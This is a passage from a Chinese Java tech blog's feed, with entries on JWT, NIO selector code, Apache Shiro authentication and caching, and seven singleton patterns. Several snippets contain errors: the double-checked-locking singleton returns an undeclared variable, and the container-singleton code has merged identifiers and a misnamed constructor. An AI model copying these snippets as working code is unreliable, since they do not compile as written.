alt="在这里插入图片描述"><br>最后该jwt形式如下：</p><pre><code>eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9</code></pre><p><strong>Java实现的jjwt开源库提供对jwt的支持</strong></p>]]></content>
    
    <summary type="html">
    
      JWT（Json Web Token）主要防止token被篡改和token信息被获取，无法防止token被获取（存在cookie或者localstorage都要风险）
    
    </summary>
    
      <category term="Web安全" scheme="https://www.dzou.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="安全" scheme="https://www.dzou.top/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>NIO学习笔记（IO、AIO、BIO）--更新中</title>
    <link href="https://www.dzou.top/post/e571ec33.html"/>
    <id>https://www.dzou.top/post/e571ec33.html</id>
    <published>2019-07-24T02:13:10.000Z</published>
    <updated>2019-08-02T11:50:57.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><p>I/O ? 或者输入/输出 ? 指的是计算机与外部世界或者一个程序与计算机的其余部分的之间的接口。它对于任何计算机系统都非常关键，因而所有 I/O 的主体实际上是内置在操作系统中的。单独的程序一般是让系统为它们完成大部分的工作。</p><p>在 Java 编程中，直到最近一直使用 流 的方式完成 I/O。所有 I/O 都被视为单个的字节的移动，通过一个称为 Stream 的对象一次移动一个字节。流 I/O 用于与外部世界接触。它也在内部使用，用于将对象转换为字节，然后再转换回对象。</p><p>传统流IO的好处是使用简单，将底层的机制都抽象成流，但缺点就是性能不足。而且IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。</p><h2 id="传统BIO（blocking-IO）"><a href="#传统BIO（blocking-IO）" class="headerlink" title="传统BIO（blocking IO）"></a>传统BIO（blocking IO）</h2><p>阻塞：accept方法，除非有socket返回，读写不能同时进行<br>当对Socket的输入流进行读取操作的时候，它会一直阻塞下去。<br>一个场景，由于网络延迟，导致数据发送缓慢。而由于使用的是阻塞IO，那么read方法一直处于阻塞状态，要等到数据传送完成才结束（返回-1）。那么这种场景下，在高并发。直接导致线程暴增、服务器宕机。<br><img src="https://img-blog.csdnimg.cn/20190604092946420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>在bio基础上，把传统多线程改为使用一定muxnum的线程池，形成伪异步IO模型，<br>实现一个或多个线程处理n个客户端，但是底层还是同步阻塞IO</strong></p><p><img src="https://img-blog.csdnimg.cn/20190604093325953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="java">//线程池 懒汉式的单例    private static ExecutorService executorService = Executors.newFixedThreadPool(60);</code></pre><p>CachedThreadPool线程池</p><p><strong>根本上无法解决高并发：因为限制了线程数量，如果发生大量并发请求，超过最大数量的线程就只能等待，直到线程池中的有空闲的线程可以被复用。</strong></p><h3 id="bio问题："><a href="#bio问题：" class="headerlink" title="bio问题："></a>bio问题：</h3><ul><li>1.没有一个socket，服务端都会开启一个线程处理</li><li>2.每一个处理操作完后，线程都会被销毁</li></ul><h2 id="NIO（new-io，Non-blocking-io）"><a href="#NIO（new-io，Non-blocking-io）" class="headerlink" title="NIO（new io，Non-blocking io）"></a>NIO（new io，Non-blocking io）</h2><p>netty框架中实现了NIO的封装</p><p>同步非阻塞IO</p><h3 id="缓冲区（Buffer）：存储写入或者读出的数据"><a href="#缓冲区（Buffer）：存储写入或者读出的数据" class="headerlink" title="缓冲区（Buffer）：存储写入或者读出的数据"></a><strong>缓冲区（Buffer）：存储写入或者读出的数据</strong></h3><p>  官方写到：<br>a Thread can ask channel to read data into a buffer ,While the channel reads data into buffer,the Thread can do else things.<br>所有数据都是用缓冲区处理的。在读取数据时，它是直接读到缓冲区中的；在写入数据时，也是写入到缓冲区中。任何时候访问NIO中的数据，都是通过缓冲区进行操作。</p><h3 id="通道（Channel）：同时读写-双向的"><a href="#通道（Channel）：同时读写-双向的" class="headerlink" title="通道（Channel）：同时读写 双向的"></a><strong>通道（Channel）：同时读写 双向的</strong></h3><p>  Channel主要分两大类：</p><pre><code>- SelectableChannel：用户网络读写- FileChannel：用于文件操作- ServerSocketChannel服务器tcp数据传输- SocketChannel客户端tcp数据传输</code></pre><h3 id="多路复用器（Selector）：提供选择已经就绪的任务的能力"><a href="#多路复用器（Selector）：提供选择已经就绪的任务的能力" class="headerlink" title="多路复用器（Selector）：提供选择已经就绪的任务的能力"></a><strong>多路复用器（Selector）：提供选择已经就绪的任务的能力</strong></h3><p>  官方写道：<br>A selector can use a thread to monitor multiple channels for even’s.<br>Selector会不断轮询注册在其上的Channel，如果某个Channel上面发生读或者写事件，这个Channel就处于就绪状态，会被Selector轮询出来，然后通过SelectionKey可以获取就绪Channel的集合，进行后续的I/O操作。</p><h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a><strong>服务端：</strong></h3><ul><li>1.打开ServerSocketChannel</li><li>2.设置为非阻塞</li><li>3.监听客户端端口，绑定监听端口</li><li>4.创建selector 把channel注册到selector上，监听我感兴趣的accept请求</li><li>5.开始listen：<br>   （1）轮询selector访问准备就绪的SelectionKey</li></ul><pre><code class="java">while(true){            selector.select();            //selector轮询准备就绪的key            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();            Iterator&lt;SelectionKey&gt; iterator = selectionKeys.iterator();            while(iterator.hasNext()){                SelectionKey selectionKey = iterator.next();                iterator.remove();                handlekey(selectionKey);            }        }</code></pre><pre><code> （2）监听到新的客户端接入，处理新的接入请求，将读写数据放在Buffer中</code></pre><pre><code class="java">if(selectionKey.isAcceptable()){            serverSocketChannel = (ServerSocketChannel) selectionKey.channel();            client = serverSocketChannel.accept();            client.configureBlocking(false);            client.register(selector,SelectionKey.OP_READ);        }else if(selectionKey.isReadable()){            client = (SocketChannel) selectionKey.channel();            receiveBuffer.clear();            -------------------------        }else if(selectionKey.isWritable()){            sendBuffer.clear();            //服务端向客户端发送数据            client = (SocketChannel) selectionKey.channel();            sendText = &quot;message from server:&quot;+flag++;            sendBuffer.put(sendText.getBytes());            sendBuffer.flip();            client.write(sendBuffer)；            client.register(selector,SelectionKey.OP_READ);        }</code></pre><pre><code></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a><strong>客户端：</strong></h3><ul><li>1.打开socket通道</li><li>2.设置非阻塞</li><li>3.创建选择器selector 注册通道 SelectionKey.connect</li><li>4.socket连接服务器ip和端口</li><li>5.轮询selector已就绪的通道</li><li>6.处理通道请求的数据</li></ul><pre><code class="java">while (true) {            selector.select();            selectionKeys = selector.selectedKeys();            iterator = selectionKeys.iterator();            while (iterator.hasNext()) {                selectionKey = iterator.next();                if (selectionKey.isConnectable()) {                    System.out.println(&quot;client connect&quot;);                    client = (SocketChannel) selectionKey.channel();                    // 判断此通道上是否正在进行连接操作。                    // 完成套接字通道的连接过程。                    if (client.isConnectionPending()) {                        client.finishConnect();                        System.out.println(&quot;完成连接!&quot;);                        sendBuffer.clear();                        sendBuffer.put(&quot;Hello,Server&quot;.getBytes());                        sendBuffer.flip();                        client.write(sendBuffer);                    }                    client.register(selector, SelectionKey.OP_READ);                } else if (selectionKey.isReadable()) {                    client = (SocketChannel) selectionKey.channel();                    //将缓冲区清空以备下次读取                    receiveBuffer.clear();                    //读取服务器发送来的数据到缓冲区中                    count = client.read(receiveBuffer);                    if (count &gt; 0) {                        receiveText = new String(receiveBuffer.array(), 0, count);                        System.out.println(&quot;客户端接受服务器端数据--:&quot; + receiveText);                        client.register(selector, SelectionKey.OP_WRITE);                    }                } else if (selectionKey.isWritable()) {                    sendBuffer.clear();                    client = (SocketChannel) selectionKey.channel();                    sendText = &quot;message from client--&quot; + (flag++);                    sendBuffer.put(sendText.getBytes());                    //将缓冲区各标志复位,因为向里面put了数据标志被改变要想从中读取数据发向服务器,就要复位                    sendBuffer.flip();                    client.write(sendBuffer);                    System.out.println(&quot;客户端向服务器端发送数据--：&quot; + sendText);                    client.register(selector, SelectionKey.OP_READ);                }            }            selectionKeys.clear();        }</code></pre><p><img src="https://img-blog.csdnimg.cn/20190604203114930.png" alt="在这里插入图片描述"></p><h2 id="AIO、BIO、NIO理解"><a href="#AIO、BIO、NIO理解" class="headerlink" title="AIO、BIO、NIO理解"></a>AIO、BIO、NIO理解</h2><ul><li><p>AIO的做法是，每个水壶上装一个开关，当水开了以后会提醒对应的线程去处理。</p></li><li><p>NIO的做法是，叫一个线程不停的循环观察每一个水壶，根据每个水壶当前的状态去处理。</p></li><li><p>BIO的做法是，叫一个线程停留在一个水壶那，直到这个水壶烧开，才去处理下一个水壶。</p></li></ul>]]></content>
    
    <summary type="html">
    
      NIO/IO/New IO/非阻塞IO
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="网络编程" scheme="https://www.dzou.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="IO" scheme="https://www.dzou.top/tags/IO/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Java安全框架 （认证、授权）--更新中</title>
    <link href="https://www.dzou.top/post/712f837.html"/>
    <id>https://www.dzou.top/post/712f837.html</id>
    <published>2019-07-24T01:55:55.000Z</published>
    <updated>2019-08-04T08:52:53.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p>权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/1.png"><ul><li>用户认证</li><li>用户授权</li></ul><p>Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份；</p><p>Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</p><hr><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="用户认证的流程"><a href="#用户认证的流程" class="headerlink" title="用户认证的流程"></a>用户认证的流程</h3><ul><li>判断该资源能否不认证就能访问</li><li>如果该资源需要认证才能访问，那判断该访问者是否认证</li><li>如果还没有认证，那么需要进行认证</li><li>认证通过后才能访问资源</li></ul><p>调用流程：</p><ul><li><p>首先通过 new IniSecurityManagerFactory 并指定一个 ini 配置文件来创建一个 SecurityManager 工厂；</p></li><li><p>接着获取 SecurityManager 并绑定到 SecurityUtils，这是一个全局设置，设置一次即可；</p></li><li><p>通过 SecurityUtils 得到 Subject，其会自动绑定到当前线程；如果在 web 环境在请求结束时需要解除绑定；然后获取身份验证的 Token，如用户名 / 密码；</p></li><li><p>调用 subject.login 方法进行登录，其会自动委托给 SecurityManager.login 方法进行登录；</p></li><li><p>如果身份验证失败请捕获 AuthenticationException 或其子类，常见的如： </p><ul><li>DisabledAccountException（禁用的帐号）、</li><li>LockedAccountException（锁定的帐号）、</li><li>UnknownAccountException（错误的帐号）、</li><li>ExcessiveAttemptsException（登录失败次数过多）、</li><li>IncorrectCredentialsException （错误的凭证）、</li><li>ExpiredCredentialsException（过期的凭证）等<br>具体请查看其继承关系；对于页面的错误消息展示，最好使用如 “用户名 / 密码错误” 而不是 “用户名错误”/“密码错误”，防止一些恶意用户非法扫描帐号库；</li></ul></li><li><p>最后可以调用 subject.logout 退出，其会自动委托给 SecurityManager.logout 方法退出。</p></li></ul><hr><h3 id="SecurityUtils-getSubject"><a href="#SecurityUtils-getSubject" class="headerlink" title="SecurityUtils.getSubject()"></a><strong>SecurityUtils.getSubject()</strong></h3><p>SecurityUtils.getSubject()是每个请求创建一个Subject, 并保存到ThreadContext的resources（ThreadLocal&lt;Map&lt;Object, Object&gt;&gt;）变量中，也就是一个http请求一个subject,并绑定到当前线程。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/2.png"><h4 id="controller接受请求后"><a href="#controller接受请求后" class="headerlink" title="controller接受请求后"></a>controller接受请求后</h4><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/3.png"><h3 id="URL拦截"><a href="#URL拦截" class="headerlink" title="URL拦截"></a>URL拦截</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/4.png"><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>用户授权的流程</p><ul><li>到达了用户授权环节，需要用户认证之后</li><li>用户访问资源，系统判断该用户是否有权限去操作该资源</li><li>如果该用户有权限才能够访问，如果没有权限就不能访问了</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/5.png"><h3 id="获取角色和权限"><a href="#获取角色和权限" class="headerlink" title="获取角色和权限"></a>获取角色和权限</h3><p>一个角色role对应多个权限，一个用户user对应多个角色<br>我们通过getSysUserRoleList和getPermissions分别获取角色列表和用户权限。</p><p>然后通过<br><code>user.hasRole(&quot;&quot;)或者role.hasPermission(&quot;&quot;)</code><br>检查用户是否有对某个操作的权限</p><h3 id="密码加密和匹配"><a href="#密码加密和匹配" class="headerlink" title="密码加密和匹配"></a>密码加密和匹配</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/6.jpeg"><ul><li><strong>Subject</strong>：</li></ul><p><strong>主体，代表了当前 “用户”</strong><br>这个用户不一定是一个具体的人，与当前应用交互的任何东西都是 Subject，如网络爬虫，机器人等；即一个抽象概念；所有 Subject 都绑定到 SecurityManager，与 Subject 的所有交互都会委托给 SecurityManager；可以把 Subject 认为是一个门面；SecurityManager 才是实际的执行者；</p><ul><li><strong>SecurityManager</strong>：</li></ul><p><strong>安全管理器</strong><br>即所有与安全有关的操作都会与 SecurityManager 交互；且它管理着所有 Subject；可以看出它是 Shiro 的核心，它负责与后边介绍的其他组件进行交互，如果学习过 SpringMVC，你可以把它看成 DispatcherServlet 前端控制器；</p><ul><li><strong>Realm</strong>：</li></ul><p><strong>域，Shiro 从从 Realm 获取安全数据（如用户、角色、权限）</strong><br>就是说 SecurityManager 要验证用户身份，那么它需要从 Realm 获取相应的用户进行比较以确定用户身份是否合法；也需要从 Realm 得到用户相应的角色 / 权限进行验证用户是否能进行操作；可以把 Realm 看成 DataSource，即安全数据源。</p><hr><h3 id="1-ShiroConfig配置类"><a href="#1-ShiroConfig配置类" class="headerlink" title="1.ShiroConfig配置类"></a><strong>1.ShiroConfig配置类</strong></h3><p>添加@Configuration和@Bean</p><ul><li>（1）创建ShiroFilterFactoryBean<ul><li>1.设置安全管理器SecurityManager </li><li>2.创建Shiro内置过滤器，实现相关url拦截，使用LinkedHashMap添加 </li><li>3.设置调整页面 </li><li>4.设置过滤器</li></ul></li></ul><pre><code class="java">/**         * anon:所有url都都可以匿名访问         * authc: 需要认证才能进行访问         * user: 如果使用 rememberme 可以直接访问         * perms：该资源必须得到资源权限才可以访问         * role：该资源必须得到角色权限才可以访问         */</code></pre><ul><li>（2）创建DefaultWebSecurityManager（主要关联自定义realm）</li><li>（3）创建自定义Realm</li><li>（4 可选）配置ShiroDialect,配合thymeleaf使用</li></ul><h3 id="2-自定义Realm类"><a href="#2-自定义Realm类" class="headerlink" title="2.自定义Realm类"></a><strong>2.自定义Realm类</strong></h3><ul><li><p>（1）可实现自定义的Credentials匹配类（实现自定义密码验证，通过添加到PostContruct作为类初始化执行）</p></li><li><p>（2）实现用户授权添加过程</p><pre><code class="java">    protected AuthorizationInfo doGetAuthorizationInfo</code></pre></li><li><p>（3）实现用户认证过程</p><pre><code class="java">  protected AuthenticationInfo doGetAuthenticationInfo</code></pre></li></ul><hr><h4 id="自定义密码验证和加密（双MD5加盐salt-随机数）"><a href="#自定义密码验证和加密（双MD5加盐salt-随机数）" class="headerlink" title="自定义密码验证和加密（双MD5加盐salt 随机数）"></a><strong>自定义密码验证和加密（双MD5加盐salt 随机数）</strong></h4><p>Realm在验证用户身份的时候，要进行密码匹配。最简单的情况就是明文直接匹配，然后就是加密匹配，这里的匹配工作则就是交给CredentialsMatcher来完成的。</p><pre><code class="java">public interface CredentialsMatcher {    boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info);}</code></pre><p>在涉及到密码存储问题上，应该加密 / 生成密码摘要存储，而不是存储明文密码。比如之前的 600w csdn 账号泄露对用户可能造成很大损失，因此应加密 / 生成不可逆的摘要方式存储。<br><strong>这时就需要自定义一个CustomCredentialsMatcher 继承SimpleCredentialsMatcher 实现密码验证</strong></p><hr><h2 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h2><ul><li>cookie</li><li>rememberMeCookieManager</li></ul><h3 id="配置RememberMeManager"><a href="#配置RememberMeManager" class="headerlink" title="配置RememberMeManager"></a>配置RememberMeManager</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/7.png"><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><ul><li><p><strong>使用缓存存储session（单服务器使用EhCacheManager）</strong></p></li><li><p><strong>但是在分布式系统中，服务器集群情况下，EhCacheManager无法解决数据共享（会多次查询数据库），则选择使用redis作为缓存</strong></p></li></ul><h3 id="Redis实现shiro缓存"><a href="#Redis实现shiro缓存" class="headerlink" title="Redis实现shiro缓存"></a>Redis实现shiro缓存</h3><ul><li><p><strong>分布式共享session和授权信息需要把session和授权持久化到数据库或者缓存 shiro集群为了防止多次插查询数据库</strong></p></li><li><p><strong>自定义实现类:或者使用crazycake开源shiro-redis实现好的工具</strong></p><ul><li><strong><em>RedisSessionDAO</em></strong>  可以继承EnterpriseCacheSessionDAO实现session控制</li><li><strong><em>RedisCache</em></strong>  继承Cache类实现具体redis操作缓存（remove、get、set、keys</li><li><strong><em>RedisCacheManager</em></strong> 实现接口CacheManager的getCache获得RedisCache交给securityManager管理</li></ul><p> <strong>使用了ConcurrentMap管理数据和缓存，更加高效</strong></p></li></ul><h3 id="缓存session和授权信息"><a href="#缓存session和授权信息" class="headerlink" title="缓存session和授权信息"></a>缓存session和授权信息</h3><h4 id="１．基于EhCache缓存（效率不高，无法解决分布式问题）"><a href="#１．基于EhCache缓存（效率不高，无法解决分布式问题）" class="headerlink" title="１．基于EhCache缓存（效率不高，无法解决分布式问题）"></a>１．基于EhCache缓存（效率不高，无法解决分布式问题）</h4><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/8.png"><h4 id="２．基于Redis缓存-CrazyCake-shiro-redis开源插件，效率高，可实现集群共享）"><a href="#２．基于Redis缓存-CrazyCake-shiro-redis开源插件，效率高，可实现集群共享）" class="headerlink" title="２．基于Redis缓存(CrazyCake　shiro-redis开源插件，效率高，可实现集群共享）"></a>２．基于Redis缓存(CrazyCake　shiro-redis开源插件，效率高，可实现集群共享）</h4><p>RedisConfig加载配置类</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/9.png"><p>sessionManager管理session</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/10.png"><p>创建cookie集群共享sessionid</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/11.png"><h2 id="Shiro配置类"><a href="#Shiro配置类" class="headerlink" title="Shiro配置类"></a>Shiro配置类</h2><h3 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a>ShiroFilterFactoryBean</h3><p>一个工厂Bean，将ShiroFilter实例对象注入到Spring容器中去，这样Shiro基于url的方式进行请求过滤处理，把安全管理器添加到该bean中。</p><h3 id="SecurityManager-管理认证和授权"><a href="#SecurityManager-管理认证和授权" class="headerlink" title="SecurityManager 管理认证和授权"></a>SecurityManager 管理认证和授权</h3><h4 id="1-SessionManager-（管理session"><a href="#1-SessionManager-（管理session" class="headerlink" title="1.SessionManager　（管理session)"></a>1.SessionManager　（管理session)</h4><h5 id="（1）SessionDao-（自定义或者crazycake）"><a href="#（1）SessionDao-（自定义或者crazycake）" class="headerlink" title="（1）SessionDao （自定义或者crazycake）"></a>（1）SessionDao （自定义或者crazycake）</h5><h5 id="（2）cookie-（存放JESSIONID）"><a href="#（2）cookie-（存放JESSIONID）" class="headerlink" title="（2）cookie　（存放JESSIONID）"></a>（2）cookie　（存放JESSIONID）</h5><h5 id="（3）redisManager-（管理redis）"><a href="#（3）redisManager-（管理redis）" class="headerlink" title="（3）redisManager　（管理redis）"></a>（3）redisManager　（管理redis）</h5><h4 id="2-CacheManager-保存用户信息和授权信息"><a href="#2-CacheManager-保存用户信息和授权信息" class="headerlink" title="2.CacheManager　保存用户信息和授权信息"></a>2.CacheManager　保存用户信息和授权信息</h4><h5 id="方式一：EhCache实现缓存管理器-编写自定义缓存方式配置文件shiro-ehcache-xml"><a href="#方式一：EhCache实现缓存管理器-编写自定义缓存方式配置文件shiro-ehcache-xml" class="headerlink" title="方式一：EhCache实现缓存管理器,编写自定义缓存方式配置文件shiro-ehcache.xml"></a>方式一：EhCache实现缓存管理器,编写自定义缓存方式配置文件shiro-ehcache.xml</h5><h5 id="方式二：redis-做缓存"><a href="#方式二：redis-做缓存" class="headerlink" title="方式二：redis 做缓存"></a>方式二：redis 做缓存</h5><h5 id="3-RememberMeManager"><a href="#3-RememberMeManager" class="headerlink" title="3.RememberMeManager"></a>3.RememberMeManager</h5><p>添加SimpleCookie作为RememberMeCookie</p><h4 id="4-MyShiroRealm（自定义认证授权实现Realm类）"><a href="#4-MyShiroRealm（自定义认证授权实现Realm类）" class="headerlink" title="4.MyShiroRealm（自定义认证授权实现Realm类）"></a>4.MyShiroRealm（自定义认证授权实现Realm类）</h4><ul><li>doGetAuthorizationInfo　授权</li><li>doGetAuthenticationInfo　认证</li><li>credentialsMatcher　配置凭证匹配器，双md5加盐加密</li></ul>]]></content>
    
    <summary type="html">
    
      Shiro JavaWeb 安全框架，实现权限管理和用户认证
    
    </summary>
    
      <category term="Web安全" scheme="https://www.dzou.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="安全" scheme="https://www.dzou.top/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.dzou.top/tags/Redis/"/>
    
      <category term="记住我" scheme="https://www.dzou.top/tags/%E8%AE%B0%E4%BD%8F%E6%88%91/"/>
    
      <category term="单点登录" scheme="https://www.dzou.top/tags/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式--单例模式(7种)</title>
    <link href="https://www.dzou.top/post/f90c55c.html"/>
    <id>https://www.dzou.top/post/f90c55c.html</id>
    <published>2019-07-24T01:50:57.000Z</published>
    <updated>2019-08-04T04:19:29.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单例模式（七种）"><a href="#单例模式（七种）" class="headerlink" title="单例模式（七种）"></a>单例模式（七种）</h2><h3 id="1-饿汉模式"><a href="#1-饿汉模式" class="headerlink" title="1. 饿汉模式"></a><strong>1. 饿汉模式</strong></h3><pre><code class="java">public class Singleton {       private static Singleton instance = new Singleton();       private Singleton (){     }     public static Singleton getInstance() {       return instance;       }   }  </code></pre><p>这种方式在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快。 这种方式基于类加载机制避免了多线程的同步问题，但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化instance显然没有达到懒加载的效果。</p><hr><h3 id="2-懒汉模式（线程不安全）"><a href="#2-懒汉模式（线程不安全）" class="headerlink" title="2. 懒汉模式（线程不安全）"></a><strong>2. 懒汉模式（线程不安全）</strong></h3><pre><code class="java">public class Singleton {        private static Singleton instance;        private Singleton (){      }         public static Singleton getInstance() {        if (instance == null) {            instance = new Singleton();        }        return instance;        }   }  </code></pre><p>懒汉模式申明了一个静态对象，在用户第一次调用时初始化，虽然节约了资源，但第一次加载时需要实例化，反映稍慢一些，而且在多线程不能正常工作。</p><hr><h3 id="3-懒汉模式（线程安全）"><a href="#3-懒汉模式（线程安全）" class="headerlink" title="3. 懒汉模式（线程安全）"></a><strong>3. 懒汉模式（线程安全）</strong></h3><pre><code class="java">public class Singleton {        private static Singleton instance;        private Singleton (){      }      public static synchronized Singleton getInstance() {        if (instance == null) {            instance = new Singleton();        }        return instance;        }   }  </code></pre><p>这种写法能够在多线程中很好的工作，但是每次调用getInstance方法时都需要进行同步，造成不必要的同步开销，而且大部分时候我们是用不到同步的，所以不建议用这种模式。</p><hr><h3 id="4-双重检查模式-（DCL）"><a href="#4-双重检查模式-（DCL）" class="headerlink" title="4. 双重检查模式 （DCL）"></a><strong>4. 双重检查模式 （DCL）</strong></h3><pre><code class="java">public class Singleton {        private volatile static Singleton instance;        private Singleton (){      }         public static Singleton getInstance() {        if (instance== null) {            synchronized (Singleton.class) {            if (instance== null) {                instance= new Singleton();            }           }       }       return singleton;       }   }  </code></pre><p>这种写法在getSingleton方法中对singleton进行了两次判空，第一次是为了不必要的同步，第二次是在singleton等于null的情况下才创建实例。在这里用到了volatile关键字这里使用volatile会或多或少的影响性能，<br>但考虑到程序的正确性，牺牲这点性能还是值得的。 DCL优点是资源利用率高，第一次执行getInstance时单例对象才被实例化，效率高。缺点是第一次加载时反应稍慢一些，在高并发环境下也有一定的缺陷，虽然发生的概率很小。DCL虽然在一定程度解决了资源的消耗和多余的同步，线程安全等问题，但是他还是在某些情况会出现失效的问题，也就是DCL失效，在《java并发编程实践》一书建议用静态内部类单例模式来替代DCL。</p><hr><h3 id="5-静态内部类单例模式"><a href="#5-静态内部类单例模式" class="headerlink" title="5. 静态内部类单例模式"></a><strong>5. 静态内部类单例模式</strong></h3><pre><code class="java">public class Singleton {     private Singleton(){    }      public static Singleton getInstance(){          return SingletonHolder.sInstance;      }      private static class SingletonHolder {          private static final Singleton sInstance = new Singleton();      }  } </code></pre><p>第一次加载Singleton类时并不会初始化sInstance，只有第一次调用getInstance方法时虚拟机加载SingletonHolder 并初始化sInstance ，这样不仅能确保线程安全也能保证Singleton类的唯一性，所以推荐使用静态内部类单例模式。</p><hr><h3 id="6-枚举单例"><a href="#6-枚举单例" class="headerlink" title="6. 枚举单例"></a><strong>6. 枚举单例</strong></h3><pre><code class="java">public enum Singleton {       INSTANCE;       public void doSomeThing() {       }   }  </code></pre><p>枚举单例的优点就是简单，但是大部分应用开发很少用枚举，可读性并不是很高，不建议用。</p><hr><p>述讲的几种单例模式实现中，有一种情况下他们会重新创建对象，那就是反序列化，将一个单例实例对象写到磁盘再读回来，从而获得了一个实例。反序列化操作提供了readResolve方法，这个方法可以让开发人员控制对象的反序列化。在上述的几个方法示例中如果要杜绝单例对象被反序列化是重新生成对象，就必须加入如下方法：</p><pre><code class="java">private Object readResolve() throws ObjectStreamException{return singleton;}</code></pre><h3 id="7-使用容器实现单例模式"><a href="#7-使用容器实现单例模式" class="headerlink" title="7.使用容器实现单例模式"></a><strong>7.使用容器实现单例模式</strong></h3><pre><code class="java">public class SingletonManager { 　　private static Map&lt;String, Object&gt; objMap = new HashMap&lt;String,Object&gt;();　　private Singleton() { 　　}　　public static void registerService(String key, Objectinstance) {　　　　if (!objMap.containsKey(key) ) {　　　　　　objMap.put(key, instance) ;　　　　}　　}　　public static ObjectgetService(String key) {　　　　return objMap.get(key) ;　　}}</code></pre><p>用SingletonManager 将多种的单例类统一管理，在使用时根据key获取对象对应类型的对象。这种方式使得我们可以管理多种类型的单例，并且在使用时可以通过统一的接口进行获取操作，降低了用户的使用成本，也对用户隐藏了具体实现，降低了耦合度。</p>]]></content>
    
    <summary type="html">
    
      单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot学习笔记--更新中</title>
    <link href="https://www.dzou.top/post/cfc248db.html"/>
    <id>https://www.dzou.top/post/cfc248db.html</id>
    <published>2019-07-24T01:45:28.000Z</published>
    <updated>2019-08-02T11:53:39.829Z</updated>
    
